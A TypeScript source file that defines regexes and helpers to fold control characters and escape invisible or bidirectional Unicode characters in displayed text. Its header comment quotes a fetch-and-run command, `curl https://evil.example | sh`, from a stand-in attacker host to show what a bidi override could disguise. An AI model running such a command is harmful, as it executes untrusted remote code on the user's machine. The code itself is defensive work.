/**
 * Characters that make rendered text differ from the text itself: C0 controls and DEL, C1
 * controls (NEL included), the Arabic letter mark, LRM/RLM, the line and paragraph separators,
 * and the bidi embeddings, overrides and isolates. An override can display
 * `curl https://evil.example | sh` as something harmless, and a newline or ESC breaks a one-line
 * row. Global: use it with `replace`, never `test`.
 */
export const CONTROL_CHARACTERS =
  /[\u0000-\u001f\u007f-\u009f\u061c\u200e\u200f\u2028\u2029\u202a-\u202e\u2066-\u2069]+/g;

/** Fold every run of {@link CONTROL_CHARACTERS} to one space, for a one-line display. */
export function foldControlCharacters(text: string): string {
  return text.replace(CONTROL_CHARACTERS, ' ');
}

/**
 * Characters a reader cannot see or cannot tell from a plain space: the controls above, NBSP,
 * soft hyphen, the Unicode spaces U+2000-U+200A, zero-width characters, word joiners, the
 * ideographic space and the BOM.
 */
const INVISIBLE_CHARACTER =
  /[\u0000-\u001f\u007f-\u00a0\u00ad\u061c\u180e\u2000-\u200f\u2028-\u202f\u205f-\u2064\u2066-\u206f\u3000\ufeff]/g;

/**
 * Show every invisible character as an escape (`\n`, `\r`, `\t`, otherwise `\uXXXX`), so a
 * model told which character was rejected can see it. Ordinary spaces are kept.
 */
export function escapeInvisibleCharacters(text: string): string {
  return text.replace(INVISIBLE_CHARACTER, (character) => {
    if (character === '\n') return '\\n';
    if (character === '\r') return '\\r';
    if (character === '\t') return '\\t';
    return `\\u${character.charCodeAt(0).toString(16).toUpperCase().padStart(4, '0')}`;
  });
}
